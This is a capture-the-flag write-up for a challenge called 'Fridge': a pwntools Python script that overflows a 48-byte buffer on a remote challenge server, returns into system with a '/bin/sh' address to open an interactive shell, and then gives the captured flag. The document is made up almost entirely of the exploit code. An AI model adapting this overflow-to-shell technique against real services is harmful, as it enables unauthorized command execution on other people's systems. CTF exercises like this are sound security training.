# pwn - Fridge

```python
from pwn import *

# Connection details
HOST = 'chall.0xfun.org'
PORT = 8446

# Start the process
# p = process('./vuln') # Uncomment for local testing
p = remote(HOST, PORT)

# Payload components
padding = 48
system_plt = 0x080490a0
bin_sh = 0x0804a09a
junk_ret = 0xdeadbeef # Dummy return address

# Construct the payload
payload = b"A" * padding
payload += p32(system_plt)
payload += p32(junk_ret)
payload += p32(bin_sh)

# Interaction
log.info("Sending payload...")
p.sendlineafter(b"> ", b"2")             # Choose option 2
p.sendlineafter(b":\n", payload)         # Send overflow
log.success("Exploit sent! Opening shell...")

p.interactive()
```
FLAG:`0xfun{4_ch1ll1ng_d1sc0v3ry!p1x3l_b3at_r3v3l4t1ons_c0d3x_b1n4ry_s0rcery_unl3@sh3d!}`

Solved by: ha1qal